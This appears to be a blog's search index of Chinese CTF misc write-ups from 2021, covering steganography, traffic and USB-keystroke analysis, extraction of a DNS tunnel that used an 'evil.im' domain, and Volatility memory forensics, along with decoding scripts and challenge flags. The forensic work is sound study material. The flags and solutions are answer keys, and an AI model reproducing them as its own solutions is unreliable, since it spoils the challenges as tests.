[{"title":"2021工业信息安全技能大赛-1","url":"/2021/08/20/2021%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-1/","content":"2021工业信息安全技能大赛-1\n\n隐藏的工程\n\n老代凭借多年工业企业运维经验，发现ICS工程师的工作电脑中有一张可疑的工艺图。在对图片进行分析时，发现其中存在异常信息，您能从中找到flag吗？flag格式为:flag{}\n\n对图片进行F5操作，\n根据提示，猜测密码为ICS\njava Extract gcwj.jpg  -e 1.txt -p ICS\n\n得到1.txt\nhttps:&#x2F;&#x2F;wwr.lanzoui.com&#x2F;iIMaiqcpaxg\n一个蓝奏云链接\n通过提取得到工程文件\n发现名为【汽机系统】的工程文件中存在kingview6.55的关键词\n\n通过查阅，能看到这是组态王6.55的相关文件\n\n","tags":["challenge","MISC"]},{"title":"2021CISCN","url":"/2021/05/18/2021CISCN/","content":"2021CISCN-Misc\n\ntiny traffic\n流量包导出http对象得到一堆文件\n其中【test】和【secret】似乎有点东西\n但直接打开为乱码\n考虑br解码\nimport brotlif &#x3D; open(&#39;secret&#39;,&#39;rb&#39;).read()print(f)c &#x3D; brotli.decompress(f)print(c)#b&#39;\\x08\\xc8\\x01\\x10\\xa2\\xd4\\x99\\x07\\x1a\\x0e\\n\\x05e2345\\x12\\x057af2c\\x1a\\x0f\\n\\x067889b0\\x12\\x0582bc0 \\xc6\\xa2\\xec\\x07*\\td172a38dc&#39;\n以上是解码后的【secret】内容，猜测为flag\n【test】\n\n根据内容搜索得到https://blog.csdn.net/u013210620/article/details/81317731\n安装好后，将test后缀改为.proto\nprotoc test.proto  --python_out&#x3D;.&#x2F;\n解决报错https://blog.csdn.net/qq_27563511/article/details/80696403\n\n得到test_pb2.py\n编写代码，\n调用这个库\n#! &#x2F;usr&#x2F;bin&#x2F;env pythonimport test_pb2flag_pb &#x3D; test_pb2.PBResponse()flag_pb.ParseFromString(b&#39;\\x08\\xc8\\x01\\x10\\xa2\\xd4\\x99\\x07\\x1a\\x0e\\n\\x05e2345\\x12\\x057af2c\\x1a\\x0f\\n\\x067889b0\\x12\\x0582bc0 \\xc6\\xa2\\xec\\x07*\\td172a38dc&#39;)print(flag_pb)\n\n按要求拼接得到\nCISCN{e66a22e23457889b0fb1146d172a38dc}\nrunning_pixel\ngif动图分离得到382张png\n观察得它们中存在统一RGB值为(233,233,233)的色块\n提取出他们的坐标值\n#!&#x2F;usr&#x2F;bin&#x2F;python# -*- coding: utf-8 -*-import cv2import numpy as npfrom PIL import Imagefor k in range(0,382):#张数    im &#x3D; Image.open(&#39;Frame%d.png&#39;%k)    # print(im.size[0])    # print(im.size[1])    for i in range(0,400):        for j in range(0,400):            #print(&#39;Frame%d.png&#39;%k)            # print(im.getpixel((i, j)))            if(im.getpixel((i, j))&#x3D;&#x3D;(233, 233, 233, 255)):                # print(&#39;Frame%d.png&#39;%k)                print(i,j)                #print(im.getpixel((i,j)))                break\n保存到xy.txt中\nfrom PIL import Imageimg&#x3D;Image.new(&#39;RGB&#39;,(400,400))file &#x3D; open(&quot;xy.txt&quot;, &quot;r&quot;)text &#x3D; file.readlines()[0]ch &#x3D; text.split(&quot; &quot;)print(ch)x &#x3D; []y &#x3D; []for i in ch:   x.append(i.split(&#39;,&#39;)[0])   y.append(i.split(&#39;,&#39;)[1])#print(x)print(len(x))for k in range(len(x)):   print(k)   img.putpixel((int(y[k]),int(x[k])),(233,233,233))   img.save(&quot;test%d.png&quot;%k)\n读取坐标值数据并写在对应位置上\n\nflag的顺序为数字依次出现的数据\nCISCN{12504d0f-9de1-4b00-87a5-a5fdd0986a00}\n隔空传话\npdu编码\n首先进行数据清洗\nimport reb &#x3D; []d &#x3D; []e &#x3D; []a &#x3D; open(&#39;data.txt&#39;)for i in a:    b.append(i[34:46])# print(b)for i in b:    # print(i)    # c &#x3D; i[::2]    # print(c)    c&#x3D;&quot;&quot;    text_list &#x3D; re.findall(&quot;.&#123;2&#125;&quot;, i)    for j in text_list:        c+&#x3D;j[::-1]    d.append(c)d &#x3D; sorted(d)# print(d)#  此时d为已经排序好的顺序for i in d:    text_list &#x3D; re.findall(&quot;.&#123;2&#125;&quot;, i)    c&#x3D;&quot;&quot;    for j in text_list:        c+&#x3D;j[::-1]    e.append(c)# print(e)file_handle&#x3D;open(&#39;dnm.txt&#39;,mode&#x3D;&#39;w&#39;)for i in range(616):    woc &#x3D; 0    c &#x3D; (&quot;调转前:&#123;&#125; |调转后: &#123;&#125; \\n&quot;.format(d[woc],e[woc]))    file_handle.write(c)    woc+&#x3D;1# e &#x3D; sorted(e)## for i in d:#     file_handle.write(&quot;&#123;&#125;\\n &quot;.format(i))#     print(i)# file2 &#x3D; open(&#39;dnm.txt&#39;)## step &#x3D; 0 #计数器# for i in file2:#     print(&quot;调转后:&#123;&#125;  调转前:&#123;&#125;&quot;.format(i,e[step]))#     step +&#x3D; 1\n\n得到类似210425194359的，按照年月日时分秒排列的数据\n经过手动匹配后，pdu解码\nhttp://www.sendsms.cn/pdu/\n补充前后关键数据如下：\n\nthe first part of the flag is the first 8 digits of your phone number 那其他部分呢 看看你能从这些数据里发现什么？w465\n拼合数据得到png\n\n贴进010后\npng根据crc32爆破长宽\n# -*- coding: utf8 -*-import osimport binasciiimport structmisc &#x3D; open(&quot;Untitled1.png&quot;, &quot;rb&quot;).read()# 爆破宽for i in range(1024):    data &#x3D; misc[12:16] + struct.pack(&#39;&gt;i&#39;, i) + misc[20:29]  # IHDR数据    crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff    if crc32 &#x3D;&#x3D; 0xBFFAF2DD:  # IHDR块的crc32值        print(&#39;weight&#39;)        print(i)        print(&quot;hex:&quot; + hex(i))# 爆破高for i in range(1024):    data &#x3D; misc[12:20] + struct.pack(&#39;&gt;i&#39;, i) + misc[24:29]    crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff    if crc32 &#x3D;&#x3D; 0xBFFAF2DD:        print(&#39;height&#39;)        print(i)        print(&quot;hex:&quot; + hex(i))# weight# 465# hex:0x1d1\n\nCISCN{15030442_b586_4c9e_b436_26def12293e4}\nrobot\n给了一个pcapng流\n通过追踪tcp流\n发现【Value.[36,35,0]】字样\n疑似坐标\n通过数据清洗\nimport rewith open(&#39;.&#x2F;tcp.txt&#39;,&#39;r&#39;,encoding&#x3D;&quot;utf-8&quot;) as f:    text &#x3D; f.read()    p1 &#x3D; re.compile(r&#39;Value\\.\\[\\d+,\\d+,-?\\d+\\.*\\d*\\]&#39;)    data &#x3D; (re.findall(p1, text))    with open(&#39;data.txt&#39;,&#39;w&#39;,encoding&#x3D;&quot;utf-8&quot;) as l:        l.write(str(data))\n得到\n\n经过处理，参考前卷代码\nfrom PIL import Imageimg&#x3D;Image.new(&#39;RGB&#39;,(400,400))mark&#x3D;[(27,36),(28,35),(29,35),(31,35),(32,35),(33,35),(35,35),(36,35),(37,35),(39,34),(40,34),(41,33),(42,32),(43,32),(45,32),(47,31),(48,29),(49,28),(49,27),(50,26),(50,25),(51,23),(51,22),(51,21),(52,20),(52,19),(52,18),(52,17),(52,16),(52,15),(51,14),(50,14),(49,14),(48,14),(47,14),(46,14),(45,14),(44,14),(43,14),(42,14),(40,14),(39,14),(37,14),(35,14),(34,14),(32,14),(30,14),(28,14),(27,14),(26,14),(25,14),(24,14),(23,14),(22,14),(21,15),(20,16),(19,17),(18,19),(18,21),(18,22),(18,23),(18,24),(18,26),(18,27),(18,28),(18,30),(18,32),(18,33),(18,34),(19,37),(21,39),(21,40),(22,42),(24,44),(24,45),(26,47),(27,48),(28,49),(29,50),(30,51),(31,52),(33,53),(34,53),(35,54),(36,54),(37,54),(38,54),(39,54),(40,54),(41,54),(44,54),(46,54),(48,54),(50,54),(52,53),(53,53),(54,52),(55,52),(56,52),(58,51),(59,50),(61,49),(62,49),(64,47),(65,47),(67,46),(68,46),(70,45),(71,44),(71,44,-10),(125,23),(125,23),(124,22),(123,22),(121,21),(118,20),(115,19),(113,19),(112,18),(111,18),(109,17),(106,16),(104,16),(103,16),(102,15),(101,15),(100,15),(99,15),(98,15),(97,15),(96,15),(95,15),(94,15),(93,15),(92,15),(91,15),(89,15),(87,17),(85,18),(85,19),(84,21),(83,21),(82,22),(82,23),(81,24),(81,26),(80,28),(80,29),(80,31),(80,32),(79,34),(79,35),(79,37),(79,39),(79,41),(79,43),(79,44),(79,46),(79,47),(80,48),(81,49),(82,50),(84,50),(87,51),(88,51),(90,51),(91,51),(93,51),(94,51),(97,51),(100,50),(101,49),(102,49),(103,48),(105,46),(106,45),(108,43),(109,42),(110,41),(111,39),(112,38),(112,36),(113,34),(114,33),(115,32),(115,31),(116,30),(117,28),(118,27),(118,28),(117,30),(116,32),(115,34),(115,36),(114,39),(114,41),(114,43),(114,45),(114,47),(114,48),(114,50),(114,52),(114,53),(115,54),(116,55),(117,56),(118,57),(120,57),(122,57),(124,57),(126,57),(128,57),(131,57),(133,57),(136,57),(138,57),(141,57),(143,56),(145,55),(147,53),(149,52),(150,52),(152,50),(153,49),(155,47),(156,46),(157,45),(157,45,-10),(212,24),(212,24),(213,23),(211,21),(210,20),(209,19),(208,18),(207,17),(206,16),(205,15),(204,15),(201,14),(200,14),(199,14),(197,14),(196,14),(195,14),(193,14),(191,14),(189,16),(188,16),(187,16),(186,17),(185,17),(183,18),(183,20),(183,21),(182,22),(182,23),(182,24),(182,25),(182,26),(182,27),(182,29),(183,31),(184,32),(186,33),(187,34),(188,34),(189,35),(190,35),(192,36),(194,37),(196,37),(198,38),(199,38),(200,38),(201,38),(202,39),(203,39),(204,40),(207,41),(207,42),(208,43),(208,44),(208,45),(208,46),(208,48),(208,50),(208,51),(207,53),(207,54),(206,56),(204,58),(203,60),(202,61),(201,62),(201,63),(200,64),(199,64),(198,64),(197,65),(196,65),(195,65),(193,65),(192,65),(190,65),(189,65),(187,65),(185,65),(184,65),(183,65),(181,64),(180,63),(179,63),(178,62),(177,62),(175,61),(174,60),(173,59),(173,59,-10),(243,20),(243,20),(244,19),(244,21),(244,25),(245,26),(245,29),(247,32),(247,34),(248,36),(248,37),(249,39),(250,40),(251,42),(251,43),(252,44),(254,44),(256,44),(258,44),(260,42),(262,41),(263,40),(265,38),(266,35),(267,32),(268,30),(271,27),(272,25),(273,22),(274,21),(275,20),(275,19),(274,18),(274,20),(272,22),(271,23),(271,26),(268,29),(266,33),(266,35),(265,37),(263,40),(262,42),(262,44),(261,47),(260,49),(259,51),(258,55),(258,56),(257,58),(255,61),(254,62),(253,63),(253,64),(252,65),(251,66),(250,67),(249,68),(248,69),(247,70),(246,71),(245,72),(244,73),(244,73,-10),(298,64),(298,64),(299,65),(300,65),(302,65),(304,65),(306,65),(308,65),(309,65),(312,65),(315,65),(317,65),(319,65),(322,65),(325,65),(327,65),(330,65),(332,65),(334,66),(335,66),(335,66,-10),(20,103),(20,104),(20,107),(20,110),(20,112),(20,114),(20,118),(19,121),(18,124),(17,126),(17,130),(17,134),(17,137),(17,139),(17,142),(17,143),(17,146),(17,147),(17,149),(17,150),(17,149),(17,148),(17,146),(18,145),(18,143),(19,142),(20,141),(20,140),(21,138),(21,137),(22,135),(23,134),(24,132),(25,131),(26,129),(27,128),(28,127),(29,126),(31,125),(32,124),(32,123),(34,121),(35,120),(37,120),(38,119),(40,118),(41,118),(43,117),(44,116),(46,115),(48,115),(49,114),(50,113),(51,113),(52,112),(52,112,-10),(80,121),(80,121),(79,120),(78,121),(77,122),(77,123),(77,124),(76,127),(75,128),(74,129),(73,131),(73,132),(73,133),(72,135),(72,136),(72,137),(72,138),(72,139),(72,140),(72,142),(72,144),(72,145),(73,148),(74,149),(77,150),(78,150),(80,151),(81,151),(82,151),(83,151),(84,151),(85,151),(87,151),(89,151),(90,151),(92,150),(93,150),(95,149),(97,147),(98,146),(99,146),(100,145),(101,144),(102,142),(102,141),(104,139),(104,138),(105,136),(105,135),(105,133),(105,132),(105,131),(105,129),(104,128),(103,126),(102,126),(101,125),(98,123),(96,123),(95,123),(93,123),(92,122),(90,121),(89,121),(86,120),(86,120,-10),(147,98),(147,98),(146,99),(145,100),(144,103),(143,104),(142,105),(142,106),(142,109),(142,111),(142,114),(141,118),(140,120),(139,123),(138,127),(138,129),(137,133),(135,135),(134,137),(133,139),(131,142),(131,143),(131,145),(130,146),(129,149),(128,152),(128,153),(127,156),(127,157),(126,158),(127,157),(129,157),(130,156),(132,156),(134,155),(137,153),(138,152),(139,151),(140,150),(143,149),(144,148),(145,147),(146,146),(147,145),(149,144),(149,143),(150,142),(151,141),(152,140),(152,139),(153,138),(153,137),(153,136),(153,135),(153,134),(153,133),(152,132),(151,131),(150,131),(149,130),(147,129),(147,129,-10),(186,136),(186,136),(183,137),(182,138),(182,139),(182,140),(181,142),(179,144),(179,145),(179,147),(178,149),(177,150),(177,151),(177,152),(177,154),(177,156),(177,157),(177,158),(178,160),(179,161),(180,162),(181,163),(182,164),(184,164),(186,164),(187,164),(188,164),(190,163),(191,162),(192,162),(194,160),(196,159),(197,158),(197,156),(198,155),(200,153),(200,152),(201,150),(201,149),(201,148),(201,147),(201,145),(201,144),(201,142),(201,141),(201,139),(201,138),(200,136),(199,135),(198,135),(197,135),(196,135),(195,135),(193,135),(192,135),(190,135),(189,135),(189,135,-10),(223,167),(223,167),(224,167),(226,167),(228,167),(229,167),(232,167),(233,167),(234,167),(235,167),(237,167),(238,167),(240,167),(241,167),(243,167),(244,167),(246,167),(247,167),(250,168),(251,168),(252,168),(253,168),(254,168),(254,168,-10),(269,135),(271,136),(273,138),(275,140),(276,141),(278,143),(280,145),(282,147),(284,149),(285,150),(288,152),(289,153),(291,154),(293,156),(294,157),(296,159),(297,160),(298,161),(299,162),(299,162,-10),(300,136),(299,136),(297,137),(296,138),(294,141),(294,142),(293,144),(293,145),(292,148),(291,149),(290,151),(288,153),(288,155),(287,156),(286,157),(285,159),(284,160),(283,161),(282,162),(281,163),(280,164),(279,165),(279,165,-10),(327,142),(328,143),(330,145),(332,148),(333,149),(335,151),(337,154),(339,156),(341,158),(342,159),(345,160),(347,161),(348,162),(350,164),(351,165),(352,166),(355,168),(356,169),(356,169,-10),(351,143),(350,143),(348,144),(347,144),(346,145),(343,148),(341,150),(339,152),(336,155),(333,158),(330,159),(327,162),(325,165),(323,167),(322,168),(319,170),(317,171),(316,171),(314,172),(313,172),(313,172)]print(mark[0])for j in range(len(mark)):    for i in range(len(mark)):        img.putpixel((list(mark[i])[0], list(mark[i])[1]), (255, 255, 255))img.save(&#39;flag.png&#39;)\n得到\n\nmd5加密\nCISCN{d4f1fb80bc11ffd722861367747c0f10}\n","tags":["challenge","MISC"]},{"title":"2021DozerCTF","url":"/2021/06/06/2021DozerCTF/","content":"2021DozerCTF\n\n不会有人以为re那道才是签到吧\nbilibili视频0.5倍速截图\n\ndetective_novel\noutput后得到zip\nzip里有flag.jpg和hint.png\nhint.png丢进010editor\n手动分离\n\n用winrar打开\n得到hint.txt【希尔顿给福尔摩斯的一封信！！！】\n和letter.png\n跳舞的小人易得到【DOZER】\n结合hint.png中关键词【guess】\n猜测为outguess加密\n\nDozerCTF&#123;Y0u_arE_h0lME4&#125;\n一点也不杂\n第一部分\n\n\nDOYOUKNOW_CRT\n第二部分\n#!&#x2F;usr&#x2F;bin&#x2F;env pythonfrom functools import reducedef egcd(a, b):    &quot;&quot;&quot;扩展欧几里得&quot;&quot;&quot;    if 0 &#x3D;&#x3D; b:        return 1, 0, a    x, y, q &#x3D; egcd(b, a % b)    x, y &#x3D; y, (x - a &#x2F;&#x2F; b * y)    return x, y, qdef chinese_remainder(pairs):    &quot;&quot;&quot;中国剩余定理&quot;&quot;&quot;    mod_list, remainder_list &#x3D; [p[0] for p in pairs], [p[1] for p in pairs]    mod_product &#x3D; reduce(lambda x, y: x * y, mod_list)    mi_list &#x3D; [mod_product&#x2F;&#x2F;x for x in mod_list]    mi_inverse &#x3D; [egcd(mi_list[i], mod_list[i])[0] for i in range(len(mi_list))]    x &#x3D; 0    for i in range(len(remainder_list)):        x +&#x3D; mi_list[i] * mi_inverse[i] * remainder_list[i]        x %&#x3D; mod_product    return xif __name__&#x3D;&#x3D;&#39;__main__&#39;:    print(chinese_remainder([(5,2) ,(7,2)  ,(17,9) ,(23,16)]))#5007\n第三部分\nbase85解密\n\n_good_over&#125;\n拼接得flag\nDozerCTF&#123;DOYOUKNOW_CRT5007_good_over&#125;\nfunny_pixel\n图片放大发现中心部分存在01字样\n\n\n利用PS提取RGB\n\n根据国赛的脚本修改\n#!&#x2F;usr&#x2F;bin&#x2F;python# -*- coding: utf-8 -*-from PIL import Imagetext&#x3D;[]for num in range(1,219):    for k in range(num,num+1):#张数一共218(1,2)(2,3)(218,219)        print(k)        im &#x3D; Image.open(&#39;%d.png&#39;%k)        # print(im.size[0])#310        # print(im.size[1])#280        for i in range(im.size[0]):            for j in range(im.size[1]):                if(im.getpixel((i, j))&#x3D;&#x3D;(239,239,39)):                    string&#x3D;str(i)+&quot;#&quot;+str(j)                    text.append(string)                    #print(im.getpixel((i,j)))        # img&#x3D;Image.new(&#39;RGB&#39;,(310,280))        # text &#x3D; file.readline()        #print(text)        ch &#x3D; []        x &#x3D; []        y &#x3D; []        for i in range(len(text)):            ch.append(str(text[i]).split(&quot;#&quot;))            #print(ch)            x &#x3D; []            y &#x3D; []            for i in ch:                x.append(i[0])                y.append(i[1])        print(x)        print(y)        # print(x)        # print(y)        # img &#x3D; Image.new(&#39;RGB&#39;, (310, 280))        # for j in range(len(x)):        #     print(int(x[j]),int(y[j]))        #     img.putpixel((int(x[j]), int(y[j])), (239, 239, 39))        #     img.save(&quot;test%d.png&quot; % k)\n考虑到如果输出图片，仍然需要肉眼识别01，\n不如寻找其中的规律\n观察发现\n\n针对0和1，识别的内容如上图\n利用notepad++进行进一步的数据操作\n\n\n同时对逗号进行进一步微调后，得到\n01000100011011110111101001100101011100100100001101010100010001100111101101000100001100000101111101111001010011110101010101011111010011000100100101101011011001010101111101010000011010010111100001000101011011000111110111\n在线进制转换\nhttp://www.ab126.com/goju/1711.html\n\nDozerCTF{D0_yOU_LIke_PixEl}\n做个问卷吧\nDozerCTF{Thank_you_for_participating_in_DozerCTF2021}\n","tags":["challenge","MISC"]},{"title":"2021津门杯","url":"/2021/05/11/2021%E6%B4%A5%E9%97%A8%E6%9D%AF/","content":"2021津门杯Misc\n\nm0usb\n\n运气好+师傅们都还没起床，有幸拿了一血\n\nusb流量\nshark -r 12.pcapng -T fields -e usb.capdata &gt; usbdata.txt\n提取出来的文件带空行，调整命令\ntshark -r 12.pcapng -T fields -e usb.capdata | sed &#39;&#x2F;^\\s*$&#x2F;d&#39; &gt; usbdata.txt\nusb脚本结合\ntxt格式（无“：”）\n更改脚本\n#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding:utf-8 -*-usb_codes &#x3D; &#123;    0x04: &quot;aA&quot;, 0x05: &quot;bB&quot;, 0x06: &quot;cC&quot;, 0x07: &quot;dD&quot;, 0x08: &quot;eE&quot;, 0x09: &quot;fF&quot;,    0x0A: &quot;gG&quot;, 0x0B: &quot;hH&quot;, 0x0C: &quot;iI&quot;, 0x0D: &quot;jJ&quot;, 0x0E: &quot;kK&quot;, 0x0F: &quot;lL&quot;,    0x10: &quot;mM&quot;, 0x11: &quot;nN&quot;, 0x12: &quot;oO&quot;, 0x13: &quot;pP&quot;, 0x14: &quot;qQ&quot;, 0x15: &quot;rR&quot;,    0x16: &quot;sS&quot;, 0x17: &quot;tT&quot;, 0x18: &quot;uU&quot;, 0x19: &quot;vV&quot;, 0x1A: &quot;wW&quot;, 0x1B: &quot;xX&quot;,    0x1C: &quot;yY&quot;, 0x1D: &quot;zZ&quot;, 0x1E: &quot;1!&quot;, 0x1F: &quot;2@&quot;, 0x20: &quot;3#&quot;, 0x21: &quot;4$&quot;,    0x22: &quot;5%&quot;, 0x23: &quot;6^&quot;, 0x24: &quot;7&amp;&quot;, 0x25: &quot;8*&quot;, 0x26: &quot;9(&quot;, 0x27: &quot;0)&quot;,    0x2C: &quot;  &quot;, 0x2D: &quot;-_&quot;, 0x2E: &quot;&#x3D;+&quot;, 0x2F: &quot;[&#123;&quot;, 0x30: &quot;]&#125;&quot;, 0x32: &quot;#~&quot;,    0x33: &quot;;:&quot;, 0x34: &quot;&#39;\\&quot;&quot;, 0x36: &quot;,&lt;&quot;, 0x37: &quot;.&gt;&quot;, 0x38: &quot;&#x2F;?&quot;, 0x39: &quot;&lt;CAP&gt;&lt;CAP&gt;&quot;,    0x3a: &quot;&lt;F1&gt;&lt;F1&gt;&quot;, 0x3b: &quot;&lt;F4&gt;&lt;F4&gt;&quot;, 0x3e: &quot;&lt;F5&gt;&lt;F5&gt;&quot;, 0x3f: &quot;&lt;F6&gt;&lt;F6&gt;&quot;,    0x40: &quot;&lt;F7&gt;&lt;F7&gt;&quot;, 0x41: &quot;&lt;F8&gt;&lt;F8&gt;&quot;, 0x42: &quot;&lt;F9&gt;&lt;F9&gt;&quot;, 0x43: &quot;&lt;F10&gt;&lt;F10&gt;&quot;,    0x44: &quot;&lt;F11&gt;&lt;F11&gt;&quot;, 0x45: &quot;&lt;F12&gt;&lt;F12&gt;&quot;&#125;data &#x3D; &#39;&#39;for x in open(&quot;uuu.txt&quot;, &quot;r&quot;).readlines():    code &#x3D; int(x[4:6], 16) # 有冒号时提取数据的[6:8]，无冒号时数据在[4:6]    # print(x[4:6])    if code &#x3D;&#x3D; 0:        continue    if code &#x3D;&#x3D; 0x28:        print(&#39;ENTER!&#39;)        print(data)        data &#x3D; &#39;&#39;        continue    upper &#x3D; 0    if int(x[0:2], 16) &#x3D;&#x3D; 0x02 or int(x[0:2], 16) &#x3D;&#x3D; 0x20:        upper &#x3D; 1    data +&#x3D; usb_codes[code][upper]print(data)# 884080810882108108821042084010421\n01248编码\n上网找到脚本\n#!&#x2F;usr&#x2F;bin&#x2F;python# -*- coding&#x3D;utf8 -*-&quot;&quot;&quot;# @Author : pig# @CreatedTime:2019-11-2423:54:02# @Description : &quot;&quot;&quot;def de_code(c):    dic &#x3D; [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;Z&quot;) + 1)]    flag &#x3D; []    c2 &#x3D; [i for i in c.split(&quot;0&quot;)]    for i in c2:        c3 &#x3D; 0        for j in i:            c3 +&#x3D; int(j)        flag.append(dic[c3 - 1])    return flagdef encode(plaintext):    dic &#x3D; [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;Z&quot;) + 1)]    m &#x3D; [i for i in plaintext]    tmp &#x3D; [];flag &#x3D; []    for i in range(len(m)):        for j in range(len(dic)):            if m[i] &#x3D;&#x3D; dic[j]:                tmp.append(j + 1)    for i in tmp:        res &#x3D; &quot;&quot;        if i &gt;&#x3D; 8:            res +&#x3D; int(i&#x2F;8)*&quot;8&quot;        if i%8 &gt;&#x3D;4:            res +&#x3D; int(i%8&#x2F;4)*&quot;4&quot;        if i%4 &gt;&#x3D;2:            res +&#x3D; int(i%4&#x2F;2)*&quot;2&quot;        if i%2 &gt;&#x3D; 1:            res +&#x3D; int(i%2&#x2F;1)*&quot;1&quot;        flag.append(res + &quot;0&quot;)    print (&quot;&quot;.join(flag)[:-1])c &#x3D; input(&quot;输入要解密的数字串:&quot;)print (de_code(c))m_code &#x3D; input(&quot;请输入要加密的数字串:&quot;)encode(m_code)# 输入要解密的数字串:884080810882108108821042084010421# [&#39;T&#39;, &#39;H&#39;, &#39;I&#39;, &#39;S&#39;, &#39;I&#39;, &#39;S&#39;, &#39;F&#39;, &#39;L&#39;, &#39;A&#39;, &#39;G&#39;]# flag&#123;THISISFLAG&#125;\nm1bmp\nlsb隐写\nStegsolve中提取最低位\n后得到base\n解码得到flag\n\ntunnel\n参考博客\nhttps://blog.xpnsec.com/bsidessf-dnscap/\ntshark -r tunnel.pcap -Tfields -e dns.qry.name &gt; names.txt\n观察得到的txt\n出现诸多【evil.im】\n观察第一行数据【UEsDBDMAAwBjAJ12k1KDFWibyjR.evil.im】\n尝试一把梭解码，发现base64：【PK\u0003\u00043\u0003cvR\u0015hÊ4】\nzip文件头\n尝试\nimport rename &#x3D; open(&#39;names.txt&#39;)a &#x3D; []b &#x3D; []for i in name:    # print(i)    if re.findall(&#39;.evil.im&#39;, i):        if i not in a:            a.append(i)print(a)\n进行数据清洗，\nbase64解码后拼接，提示zip格式报错。\n卡住\n事后复现的时候才知道\n此处应当对base64按行补齐，再进行拼接\nwith open(&quot;11.txt&quot;, &quot;r&quot;) as f:    x &#x3D; f.readlines()for i in x:    i &#x3D; i.strip()    # print(i)    l &#x3D; 4 - len(i) % 4    # print(l)    if l !&#x3D; 4:        i +&#x3D; &quot;&#x3D;&quot;* l    print(i)\n这样才能得到不报错的zip压缩包\ndef inttobin(a, n):    ret &#x3D; bin(a)[2:]    while len(ret) &lt; n:        ret &#x3D; &#39;0&#39; + ret    return rettable &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#39;f &#x3D; open(&quot;2.txt&quot;, &quot;r&quot;)tmpbin &#x3D; &#39;&#39;res &#x3D; &#39;&#39;line &#x3D; f.readline()while line:    if line[-2] &#x3D;&#x3D; &#39;&#x3D;&#39;:        if line[-3] &#x3D;&#x3D; &#39;&#x3D;&#39;:            tmpbin +&#x3D; inttobin(table.index(line[-4]), 6)[2:]        else:            tmpbin +&#x3D; inttobin(table.index(line[-3]), 6)[4:]    line &#x3D; f.readline()quotient &#x3D; int(len(tmpbin)&#x2F;8)for i in range(quotient):    res +&#x3D; chr(int(tmpbin[8*i:8*i+8], 2))print(res)# password: B@%MG&quot;6FjbS8^c#r                                                                     \n\n","tags":["challenge","MISC"]},{"title":"2021第五届蓝帽杯初赛","url":"/2021/05/04/2021%E7%AC%AC%E4%BA%94%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B/","content":"2021第五届蓝帽杯初赛\n\n冬奥会_is_coming\nmp3考虑mp3stego，这一步的密钥是冬奥会开始日期（八位数字）\n用python,print出来后\n✌︎ ☝︎♓︎⧫︎☟︎◆︎♌︎ ❒︎♏︎◻︎□︎⬧︎♓︎⧫︎□︎❒︎⍓︎ ■︎♋︎❍︎♏︎♎︎ 📂︎♍︎♏︎🏱︎♏︎♋︎🙵 ♓︎⬧︎ ❖︎♏︎❒︎⍓︎ ♓︎■︎⧫︎♏︎❒︎♏︎⬧︎⧫︎♓︎■︎♑︎📬︎ 🕈︎♒︎⍓︎ ■︎□︎⧫︎ ⧫︎♋︎🙵♏︎ ♋︎ ●︎□︎□︎🙵 ♋︎⧫︎ ♓︎⧫︎✍︎\n找到网站https://wingdingstranslator.com/\n\n找到对应的github\n\n用notepad++打开\n\n发现密钥mp3\n发现cipher字样：https://www.ifreesite.com/unicode/\n得到表情\n\n参考这篇博客\nhttps://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/\n得到带密钥的emoji表情解密网站\nhttps://emoji-aes.miaotony.xyz/\n得到flag\n\nflag{e32f619b-dbcd-49bd-9126-5d841aa01767}\n","tags":["challenge","MISC"]},{"title":"2021年第六届全国网络空间安全技术大赛Misc","url":"/2021/05/11/2021%E5%B9%B4%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BMisc/","content":"2021年第六届全国网络空间安全技术大赛Misc\n\nRGB\n一共得到28864行RGB数据，\n通过不断尝试分解64 x 11 x 41\nfrom PIL import Imagex &#x3D; 176y &#x3D; 164img &#x3D; Image.new(&#39;RGB&#39;,(x,y))file &#x3D; open(&#39;R#G#B.txt&#39;, &#39;r&#39;)for width in range(0,x):    for height in range(0,y):        line &#x3D; file.readline()        print line        rgb &#x3D; line.split(&#39;#&#39;)        print rgb        img.putpixel((width,height),(int(rgb[0]),int(rgb[1]),int(rgb[2])))img.save(&#39;rgb1.jpg&#39;)\n\n水平翻转得到flag{c1d836d1db9d42dd}\nzip\n压缩包ARCHPR爆破得到密码【ff123】\n得到【readme.txt】\n培根密码BABBBBBAAAABAAB# XYJ# xyj\n【文章.docx】解密后\n\n全选上色\n得到flag{cbfacb9df0c7caf9a2b8a8ffbd72d1a0}\nMemory_1\n# 查看可能版本 volatility -f mal.vmem imageinfo # 查看进程 volatility -f mal.vmem --profile&#x3D;Win7SP1x64 pslist\n观察时间规律，发现曾经打开cmd\n\n然而\nvolatility -f mal.vmem --profile&#x3D;Win7SP1x64 cmdscan\n只能看到ipconfig\n发现文章https://wiki.wgpsec.org/knowledge/ctf/Volatility.html\n尝试查看cmd的详细历史命令\nvolatility -f mal.vmem --profile&#x3D;Win7SP1x64 cmdline\n经过多次尝试，确定病毒名为\n\nflag{24060da3d327991115a96e7099da25c3}\nMemory_2\n看一下用户信息\nvolatility -f mal.vmem --profile&#x3D;Win7SP1x64 printkey -K 